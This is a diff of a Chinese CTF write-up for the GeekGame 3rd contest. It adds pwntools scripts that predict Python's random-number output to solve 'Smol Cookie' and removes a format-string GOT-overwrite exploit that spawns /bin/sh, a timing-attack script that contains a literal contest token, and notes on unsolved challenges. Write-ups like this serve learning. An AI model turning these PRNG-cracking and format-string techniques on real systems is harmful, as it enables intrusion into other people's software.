-## 华维码
-### Flag 1：华维码 · 特难
+#### Flag 1：Smol Cookie
+都知道编程语言的随机数实际上是伪随机数，如果拿到Python的random库生成的连续624个32位整数，就可以用[Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)预测后面的随机数序列。正好源代码里给出来的空白字节是2500个，相当于625个32位整数，那么就可以运行一次程序，拿输出结果前624个32位整数预测最后一个确保准确性，然后再预测出后面的随机数序列，与输出结果异或，得到flag 1。我最初用的代码是把程序输出保存到本地的，补一个直接从网站获取的代码：
+
+``` python
+from pwn import *
+from randcrack import RandCrack
+
+def xor_arrays(a, b, *args):
+  if args:
+    return xor_arrays(a, xor_arrays(b, *args))
+  return bytes([x ^ y for x, y in zip(a, b)])
+
+conn = remote("prob08.geekgame.pku.edu.cn", 10008)
+conn.recvuntil(b"Please input your token: ")
+conn.sendline(b"MY TOKEN")
+
+conn.recvuntil(b"Choose one: ")
+conn.sendline(b"1")
+conn.recvuntil(b"*You heard a obscure voice coming from the void*\n")
+
+ancient_words = conn.recvline().decode("utf8").strip()
+ancient_bytes = bytes.fromhex(ancient_words)
+
+rc = RandCrack()
+for i in range(0, 624 * 4, 4):
+  rc.submit(ancient_bytes[i] + (ancient_bytes[i + 1] << 8) + (ancient_bytes[i + 2] << 16) + (ancient_bytes[i + 3] << 24))
+
+rand_bytes = ancient_bytes[:624 * 4]
+for i in range(624 * 4, len(ancient_bytes), 4):
+  rand_bytes += rc.predict_getrandbits(32).to_bytes(4, "little")
+
+assert ancient_bytes[624 * 4:625 * 4] == rand_bytes[624 * 4:625 * 4]
+
+print(xor_arrays(ancient_bytes, rand_bytes).strip(b"\0").decode("utf8").strip())
+```
+
+#### Flag 2
+（赛后交流补记）
+
+类似于flag 1，同样需要预测随机数，但是本题出现了3个随机数序列，稍微有些麻烦。
+
+虽然题目提示了“可以看看[Python的Random实现](https://github.com/python/cpython/blob/main/Modules/_randommodule.c)”，但是我本能地觉得这种算法题不好做，就没深入分析源代码。[官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob08-cookie)的命题思路应该确实是想让我们模拟随机数的计算方法，但是有捷径——虽然题目不允许`seed1 == seed2`，但是当输入的随机数种子是数值时会取绝对值，所以只需要让`seed2 = -seed1`就可以抵消掉rand1和rand2，然后拿flag 1的方法解。更意外的是，甚至随便输个数进去都可以，三个随机数亦或之后和一个随机数的生成效果是一致的。好吧，这些我确实都没想到。补一个解题脚本：
+
+``` python
+from pwn import *
+from randcrack import RandCrack
+
+def xor_arrays(a, b, *args):
+  if args:
+    return xor_arrays(a, xor_arrays(b, *args))
+  return bytes([x ^ y for x, y in zip(a, b)])
+
+conn = remote("prob08.geekgame.pku.edu.cn", 10008)
+conn.recvuntil(b"Please input your token: ")
+conn.sendline(b"MY TOKEN")
+
+conn.recvuntil(b"Choose one: ")
+conn.sendline(b"2")
+conn.recvuntil("Ƀēħꝋłđ, ⱦħīꞥē ēɏēꞩ đꝋꞩⱦ ȼⱥⱦȼħ ⱥ ӻɍⱥꞡᵯēꞥⱦ ꝋӻ ēꞩꝋⱦēɍīȼ ēꞥīꞡᵯⱥ, ⱥ ᵯēɍē ꞡłīᵯᵯēɍ ⱳīⱦħīꞥ ⱦħē ӻⱥⱦħꝋᵯłēꞩꞩ ⱥƀɏꞩꞩ.\n".encode("utf8"))
+
+seed1 = int(conn.recvline().decode("utf8").strip("\n<>"), 16)
+conn.recvuntil("Ⱳħⱥⱦ ɍēꞩꝑꝋꞥꞩē đꝋꞩⱦ ⱦħꝋᵾ ꝑɍꝋӻӻēɍ, ꝑᵾꞥɏ ᵯꝋɍⱦⱥł?\n".encode("utf8"))
+conn.sendline(f"-{seed1}".encode("utf8"))
+
+conn.recvuntil(b"*You heard a more obscure voice coming from the void*\n")
+
+ancient_words = conn.recvline().decode("utf8").strip()
+ancient_bytes = bytes.fromhex(ancient_words)
+
+rc = RandCrack()
+for i in range(0, 624 * 4, 4):
+  rc.submit(ancient_bytes[i] + (ancient_bytes[i + 1] << 8) + (ancient_bytes[i + 2] << 16) + (ancient_bytes[i + 3] << 24))
+
+rand_bytes = ancient_bytes[:624 * 4]
+for i in range(624 * 4, len(ancient_bytes), 4):
+  rand_bytes += rc.predict_getrandbits(32).to_bytes(4, "little")
+
+assert ancient_bytes[624 * 4:625 * 4] == rand_bytes[624 * 4:625 * 4]
+
+print(xor_arrays(ancient_bytes, rand_bytes).strip(b"\0").decode("utf8").strip())
+```
+
+#### Flag 3
+（赛后交流补记）
+
+这题就更复杂了，同样需要预测随机数序列，不过程序没有像flag 2一样判断输入不等于输出，所以直接把程序的输出喂回去就行。补一个解题脚本：
+
+``` python
+from pwn import *
+
+def xor_arrays(a, b, *args):
+  if args:
+    return xor_arrays(a, xor_arrays(b, *args))
+  return bytes([x ^ y for x, y in zip(a, b)])
+
+conn = remote("prob08.geekgame.pku.edu.cn", 10008)
+conn.recvuntil(b"Please input your token: ")
+conn.sendline(b"MY TOKEN")
+
+conn.recvuntil(b"Choose one: ")
+conn.sendline(b"3")
+conn.recvuntil("Ⱦħē đⱥɏ ꝋӻ ɍēȼҟꝋꞥīꞥꞡ đɍⱥⱳēⱦħ ꞥīꞡħ ⱳīⱦħ ħⱥꞩⱦē. Ħⱥꞩⱦēꞥ, ꝋɍ ӻꝋɍӻēīⱦ ⱥłł.\n".encode("utf8"))
+
+curses = conn.recvline().decode("utf8").strip("\n<>")
+conn.recvuntil("Ⱳħⱥⱦ ɍēꞩꝑꝋꞥꞩē đꝋꞩⱦ ⱦħꝋᵾ ꝑɍꝋӻӻēɍ, ꝑᵾꞥɏ ᵯꝋɍⱦⱥł?\n".encode("utf8"))
+conn.sendline(curses.replace("0x", "").encode("utf8"))
+
+conn.recvuntil(b"Good job, Smol Tako! Here's your delicious SUPA BIG cookie! uwu\n")
+print(conn.recvline().decode("utf8").strip())
+```
+
+（这两个题当初我多研究研究说不定也能做出来来着）
+
+### 华维码
+> [题面和官方题解](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob19-qrcode)
+
+#### Flag 1：华维码 · 特难
 又是二维码（QR码）题，直接把图片下载到本地拼，检查发现是左上角的图块缺失，直接补上就行。根据[二维码的规则](https://zh.wikipedia.org/wiki/QR%E7%A2%BC#%E7%BB%93%E6%9E%84)，很容易就能确定左上、右上、左下三个角的图块。然后根据黑、白、黑、白的交替确定第二列和第二行的图块。最后根据右下角的校正标志确定第四行第四列的图块，以及其右边和下边的图块二选一。
 
 {% include figure.html src="3b44e120cad2ae1fa97acc81790ac14e.png" alt="已确认的图块" width="125" height="125" %}
@@ -1091,159 +1457,6 @@ for a, b in [("012", "011"), ("011", "012")]:
 ```
 
 最后得到flag。
-
-## 其他有思路但没做出来的题
-### Dark Room-Flag 2
-Flag 2所在的房间在最终房间的下面，通过输入空字符串能把一部分代码泄露出来：
-
-``` text
-invalid literal for int() with base 10: ''
-Traceback (most recent call last):
-    File "dark_room/player.py", line 249, in <module>
-    248:   while flag_number:
-    249:      choice = int(self.recv(b"Guess my public key (give me a number): ").decode())
-                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-    250:      if flag_number & 1:
-    251:          p = getStrongPrime(2048)
-    252:          q = getStrongPrime(2048)
-    253:      flag_number >>= 1
-ValueError: invalid literal for int() with base 10: ''
-```
-
-然后就不知道怎么做了，看程序大概是生成了一个大质数，总不会是要爆破这个大质数吧？
-
-### 麦恩·库拉夫特-Flag 3：为什么会变成这样呢？
-用NBTExplorer能找到Flag 3所在的红石电路区域，通过替换材质包的方法可以显示出红石电路的信号强度，搭配OBS录屏，按照5 fps的帧率截图并识别信号强度，可以读出来一段字节序列：
-
-```
-10B55874DB222471B5BE9775109E779ABE03227745767B210DF0BA7109DEB09864542136010213107A2752FD54AE102F239AE8ABD2A17E79FE10DF1584442D810183510E3AB5104F57FB100A41190B506FB4EE6E4B3B1E55987866B810BDA0EE60F86D8DD84910B410BB1071B800887E7600A4BEE1F3092531555B1001AB91010806115024F0EAD16B1F21050F1034AED2F239AED2BEAA1438E6810ADDE2AF67DB4298E810D6437D608388AE726DE170B33BDA4888B25E10BEE9E179BBE7B105D7B3863E302EFE10419279AA01090FF81010AAF4D7AD58090A57BFBA924310102F09780101D1054FE3AA58AA82D04AE3AD8557F0E2155F6652E10106510101544BBF517FF5101031E444F2A300E518411AD7789E47661EF210107A5D0017D7010185D6A90D522D3013215BFEE02BE721010F9A01046100F1021AED4105BBEAA73995610F7095F6A7BBB54F1333D021D19D484489155310755A8E7DD10E09A1AE8FE1010358D100551010B61044952B106D509D9848887710E910820E55FDBE355839D5F500118BBBD287E1A57105F2893E20EDAB55AA32D78FB15FB0D90D69E0770077E2F6889B10B4605A41E7DA45D80911022B47877311A510B82B48D51010E91B2F25A30AA9E9299718E851033A025B996AFB6A10A9881710554FE3A58DEEE46A01DFBEA64A48B5AFEA0507F11BD5D10920670771106B998AF12DE229AEF411B341079109B9BB63195102986651FF33D1110DE2ADB534510A87D40108E477B9A6822DA334B2D510F5D3B94AA10B951089EEA3110110B1B10103F5504570EED10A00D56626EBF108F5AAEE5B13309972101750B66009AFAF9755337E35BB51D5400E6610AAA716D02313F789ADED55B815AB8F4D3B9AA96B7B9F6B2BFF2B41B10D1010E1619E5466BABF44F8FF8D911BAE9535510EBE5B3310F668855D104A361010727B518872D6FFFAE1EE311AD8FE3101011EAB6640D9701085755188FD29A3A106105DDD3F52220EB10DD362210F10421077D2897E8F550B977E1A57D5F23677668143BBB13A3922EB065F1142D471E221E1010E910559E1913FEFAEEF77115BDD2A7A121F72D3AA8B71A557AE66D1E52689D81108B59E1010ABDE0438103B8589447A8A02FFFEFA27195E1AA5710D52E32AF42EB28E86748FAB15ABB10AA2583106265FBA2510510D4A10E1AA06EB5A78B644B94F6610D374778BA2F9716AAEBF779718975103D10105B8F1154F6FBE6386D22D7B5AB01D3183E58B33B79BAF22233A010310B4F8466B21109799D10B74D166E88D5228F4D33B9AA963A57191010FDF3B5A5D9AB0AE6A111B5E5B66746E8944F915598F7246FF7074861799488300A5FF5D5881ABDB61055810E6BD00101D27ED21F110A3EB1F80FBB62AF7795D6AF8DD38131775BF56992864764A10A00BF4C776416A5CFBEEF38EBFAE3700468BEFD0E7357C171B93758BBEFF6B55218CD87FAE158D4DD7616ABBF5626DDDE7F7F0049B4950A8BB1A2C000000004945444A4426080000000000000DA3330E411F55102310410A84EB3AAAE90103A084928585109274E85591777288DBBA573D5739BE11F101DB310F10729E03D106D584537AB488A104E1B18DFE79A6115F3E57BB83ABB18B38617B447A409F9E92B4D42134104E809AAEDF51024F3E6AB437756F289AA10FD9075EAE07BF101E7EE30E809AED2A38DF03ED7297657B810E613410BD13B30A6E7242D77F96B10AA9D915503D576DE1023BA10FB5D0E88BEB60B477D9E14E677ED912359910E22B51010FE517DD3AD66D224F451FEDE0177E1010B5816E856BA13710A1E6224B48BE7DDDBA6B3332EA76884BFA29FA0643583E101055B797DDA2F714FB5786739999FF08DD7130157993D
-```
-
-但是直接把这个字节序列扔到HxD里看着像是乱码，因为不知道起始数据在哪里，也看不出来循环体，所以没法分析是什么二进制文件，于是作罢。
-
-### 简单的打字稿
-TypeScript的类型只在编译的时候检查，所以只能想办法搞坏编译器，但是不知道怎样才能让“flag”的内容输出而不输出“flag”这几个字。
-
-### 初学 C 语言-Flag 2
-这个题和下面的Baby Stack-Flag 2好像都是利用printf的格式化字符串漏洞，但是这个题的程序似乎有保护，所以没能想出来。
-
-### Baby Stack
-#### Flag 1
-int溢出很容易猜到，第一步输入0即可，程序里也给了后门，想到是把函数返回地址替换成后门所在的地址。但是栈溢出不知道如何才能利用，buffer的位置似乎是在函数返回地址的下面，也没法用格式化字符串漏洞泄露实际运行的地址。
-
-#### Flag 2
-这个题似乎就是教程上写的题目类型，因为最后用到的函数是`puts`，所以想到把`puts`替换为`system`，第一步泄露真实地址，第二步替换got表的跳转地址，写了个程序：
-
-``` python
-from pwn import *
-
-context.log_level = "debug"
-context.bits = 64
-
-elf = ELF("./challenge2")
-r = process("./challenge2")
-libc = ELF("./libc.so.6")
-
-offset = 14
-puts_got = elf.got["puts"]
-log.success("puts_got    => {}".format(hex(puts_got)))
-
-r.recvuntil(b"please enter your flag~(less than 0x20 characters)\n")
-payload = f"%{offset + 1}$s".encode("utf-8").ljust(8, b"a") + p64(puts_got)
-r.sendline(payload)
-
-printf_addr = r.recvline()[len(b"this is your flag: "):]
-printf_addr = struct.unpack("<Q", printf_addr[:printf_addr.index(b"a")].ljust(8, b"\x00"))[0]
-log.success("puts_addr   => {}".format(hex(printf_addr)))
-
-system_addr = printf_addr - (libc.symbols["puts"] - libc.symbols["system"])
-log.success("system_addr => {}".format(hex(system_addr)))
-
-btw = sorted(((system_addr & 0xff, 0), ((system_addr >> 8) & 0xff, 1), ((system_addr >> 16) & 0xff, 2)))
-payload = f"%{btw[0][0]}c%{offset + 5}$hhn%{btw[1][0] - btw[0][0]}c%{offset + 6}$hhn%{btw[2][0] - btw[1][0]}c%{offset + 7}$hhn".encode().ljust(40, b"a") + p64(puts_got + btw[0][1]) + p64(puts_got + btw[1][1]) + p64(puts_got + btw[2][1])
-print(payload)
-
-r.recvuntil(b"What will you do to capture it?:")
-r.sendline(payload)
-
-r.recvuntil(b" and your flag again? :")
-payload = b"/bin/sh"
-r.sendline(payload)
-
-r.interactive()
-```
-
-但是实际运行的时候会在换got表的跳转地址时报错，检查了一下程序是可以对got表进行写入的，不知道是哪里出了问题。
-
-## 赛后交流补记
-赛后在群里和其他选手交流才发现有些题其实我也是能做出来的，还是自己经验不足啊。
-
-### Dark Room-Flag 2
-“泄露出来的源代码”其实更重要的信息是“调用了`getStrongPrime`这个函数”，我在手动输入的时候也发现了有时候程序返回信息会比较慢，我还以为是网络原因，经过提醒之后才知道，这个程序从低到高依次比较了`flag_number`的每一位（bit），如果是1就调用`getStrongPrime`，如果是0就不调用，这样就可以通过比较程序返回信息的时间来判断`flag_number`的每一位是0还是1，从而得到`flag_number`的值。
-
-{% include figure.html src="4263edde05485b078af40d3e5a5c92ce.png" alt="Copilot，你怎么不早告诉我" width="499.5" height="42.5" %}
-
-拿flag 1的程序改一下：
-
-``` python
-from pwn import *
-
-COMMANDS = [
-  "n",
-  "n",
-  "w",
-  "w",
-  "s",
-  "s",
-  "getflag",
-]
-
-def play():
-  writer = open("output/flag2.txt", "w", -1, "utf8")
-  conn = remote("prob16.geekgame.pku.edu.cn", 10016)
-  conn.recvuntil(b"Please input your token: ")
-  conn.send(b"448:MEYCIQCWia84qwxiWuYqqtctrw6YAzAGcevIrzAikp7FGKm9LwIhAIS_ydCHSUczXU9RK5Cn8fH8acfvPtuj7nrOWU6UtPJW\n")
-  time.sleep(1)
-  conn.recvuntil(b"]: ", timeout=5)
-  conn.send(b"newgame\n")
-  conn.recvuntil(b"]: ", timeout=5)
-  conn.send(b"gamer\n")
-  conn.recvuntil(b"(y/n) ", timeout=5)
-  conn.send(b"y\n")
-  for command in COMMANDS:
-    conn.recvuntil(b"]: ", timeout=5)
-    conn.send(command.encode("utf8") + b"\n")
-
-  start_time = time.time()
-  first = True
-  while True:
-    conn.recvline()
-    line = conn.recvline().decode("utf8").strip()
-    now = time.time()
-    if now - start_time > 0.95:
-      writer.write("1")
-      writer.flush()
-    else:
-      if not first:
-        writer.write("0")
-        writer.flush()
-      else:
-        first = False
-    if line == "Challenge Failed":
-      break
-    start_time = time.time()
-    conn.sendline(b"0")
-  writer.close()
-
-play()
-```
-
-拿到每一位的信息之后反转字符串，然后转换成16进制，发现是flag 2的字节序列，导入HxD即可读出。
-
-顺带一提，上面之所以打引号是因为出题人赛后说这个报错信息是故意的，不是真的泄露源代码。实际上并没有生成大质数，而是直接`sleep(1)`。
-
-### 麦恩·库拉夫特-Flag 3：为什么会变成这样呢？
-思路应该是对的，只不过我忘了信息里给出来了“数据大小2KB”这个信息，计算了一下按照2048个字节、2.5字节/秒的速度，需要大概14分钟才能接收到所有信息，而我使用笔记本录屏的时候总是会出现莫名其妙的错误，导致实际上并没有读出来一整个循环节就结束了。之后回去应该拿台式机试一试。
 
 ## 后记
 对我来说这是第二次正式参加这种比赛，虽然跟我本人专业也不太相关，但是就是觉得很有意思。比赛的题目都挺有意思的，是我自己太菜了，二进制和算法题都不太熟练，不过这次比赛中我也是边做题边学习，了解了很多知识，希望对之后的学习、生活、科研甚至是以后找工作都有帮助吧。
